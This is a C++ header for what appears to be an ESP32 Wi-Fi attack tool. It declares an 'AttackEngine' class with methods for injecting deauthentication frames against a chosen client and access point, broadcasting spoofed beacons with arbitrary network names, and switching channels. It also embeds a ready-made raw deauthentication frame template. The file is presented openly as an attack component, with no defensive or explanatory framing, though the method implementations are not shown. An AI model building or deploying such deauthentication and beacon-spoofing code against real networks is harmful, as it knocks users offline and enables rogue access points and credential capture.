#ifndef ATTACK_ENGINE_H
#define ATTACK_ENGINE_H

#include "config.h"
#include <WiFi.h>

class AttackEngine {
public:
    AttackEngine();
    void begin();
    
    // Packet Injection
    void sendDeauth(uint8_t* targetMac, uint8_t* apMac, int reason = 1);
    void sendBeacon(String ssid);
    
    // Utils
    void setChannel(int ch);
    
private:
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01, // Frame Control, Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter (Target AP)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Target AP)
        0x00, 0x00, // Sequence
        0x07, 0x00 // Reason code
    };
    
    // Helper to build frames
    void buildDeauth(uint8_t* target, uint8_t* source, int reason);
};

extern AttackEngine attackEngine;

#endif
